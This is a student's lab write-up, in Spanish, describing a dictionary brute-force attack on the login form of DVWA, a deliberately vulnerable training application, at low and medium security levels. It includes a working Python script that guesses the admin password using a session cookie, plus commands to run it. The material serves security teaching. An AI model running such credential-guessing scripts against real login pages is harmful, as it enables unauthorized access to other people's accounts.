# Práctica 01: Brute Force (Fuerza Bruta)

**Autor:** Ruben Ferrer (brean-rb / 10813818)
**Asignatura:** Puesta en Producción Segura

## Descripción de la Vulnerabilidad

El ataque de Fuerza Bruta consiste en un método de prueba y error para adivinar credenciales (usuario y contraseña) mediante la automatización. En esta práctica, el objetivo es vulnerar el formulario de autenticación de **DVWA** para obtener la contraseña del usuario `admin` probando múltiples combinaciones desde un diccionario predefinido.

## Justificación Técnica: Selección de Herramientas

> **Nota sobre la Metodología**
>
> Inicialmente se planteó el uso de la herramienta estándar **Hydra**. Sin embargo, durante la ejecución en el entorno de laboratorio, se detectaron errores persistentes de sintaxis y compatibilidad relacionados con la gestión de cookies de sesión (PHPSESSID) y el manejo de los parámetros HTTP en la versión desplegada de DVWA.
>
> Para garantizar la reproducibilidad y el éxito del ataque, se optó por desarrollar **scripts personalizados en Python**. Esta aproximación programática permite:
> 1. Control total sobre las cabeceras HTTP y la inyección de cookies.
> 2. Gestión nativa de los tiempos de espera (timeouts) del servidor, crucial para el nivel Medio.
> 3. Eliminación de falsos positivos derivados de errores de conexión de herramientas automatizadas.

## Estructura de Archivos

* `brute_low.py`: Script de ataque desarrollado para el nivel de seguridad bajo.
* `brute_medium.py`: Script de ataque adaptado para gestionar retardos en el nivel medio.
* `diccionario.txt`: Archivo de texto plano conteniendo la lista de contraseñas candidatas.
* `README.md`: Documentación técnica de la práctica.

---

## Nivel: LOW

### Análisis
En el nivel de seguridad bajo, la aplicación no implementa ninguna medida de protección contra ataques de fuerza bruta. No existen mecanismos de bloqueo de cuenta, retardos artificiales (sleep) ni desafíos CAPTCHA. El servidor responde inmediatamente a cada intento de inicio de sesión.

### Implementación del Ataque (`brute_low.py`)
El script itera sobre el archivo `diccionario.txt`, enviando peticiones GET al servidor. Se verifica la respuesta buscando la cadena de éxito "Welcome".

**Configuración del Script:**
Se requiere extraer el `PHPSESSID` del navegador (F12 > Storage > Cookies) para mantener la sesión autenticada durante el ataque.

```python
import requests

# Configuración del Objetivo
target_ip = "192.168.0.39"
session_id = "<INSERTAR_PHPSESSID_AQUI>"
security_level = "low"

url = f"http://{target_ip}:9090/vulnerabilities/brute/"
cookies = {'PHPSESSID': session_id, 'security': security_level}

# Lógica del Ataque
with open("diccionario.txt", "r") as f:
    passwords = f.read().splitlines()

for password in passwords:
    params = {'username': 'admin', 'password': password, 'Login': 'Login'}
    try:
        r = requests.get(url, params=params, cookies=cookies)
        if "Welcome" in r.text:
            print(f"[SUCCESS] Contraseña encontrada: {password}")
            break
    except Exception as e:
        print(f"Error de conexión: {e}")

```

### Reproducción

1. Editar `brute_low.py` e insertar el `PHPSESSID` actual.
2. Ejecutar el script:
```bash
python3 brute_low.py

```

### Evidencia

Captura de pantalla demostrando la obtención de la contraseña en texto claro.
![Brute Force Low](../asset/01_brute_force_low.png)

---

## Nivel: MEDIUM

### Análisis

En el nivel medio, la aplicación introduce una medida de seguridad pasiva: un **retardo artificial (sleep)** de 2 segundos tras cada intento fallido de autenticación.

* **Impacto:** Ralentiza significativamente el ataque, haciendo inviable el uso de fuerza bruta masiva en corto tiempo.
* **Vulnerabilidad:** Aunque lento, el ataque sigue siendo posible ya que no hay bloqueo definitivo de la cuenta.

### Adaptación del Script (`brute_medium.py`)

El script en Python maneja este comportamiento de forma síncrona, esperando la respuesta del servidor antes de lanzar el siguiente intento. Esto evita errores de "Connection Refused" o timeouts que herramientas como Hydra podrían interpretar como fallos de servicio.

La única modificación técnica respecto al nivel anterior es el cambio en la cookie de seguridad:

```python
# Configuración para nivel medio
security_level = "medium" 
# El resto de la lógica de requests.get maneja la espera del servidor automáticamente.

```

### Reproducción

1. Asegurarse de que el nivel de seguridad en DVWA (o en la cookie) está en `medium`.
2. Ejecutar el script:
```bash
python3 brute_medium.py

```



### Evidencia

El script logra identificar la contraseña a pesar del retardo introducido por el servidor.
![Brute Force Medium](../asset/01_brute_force_medium.png)
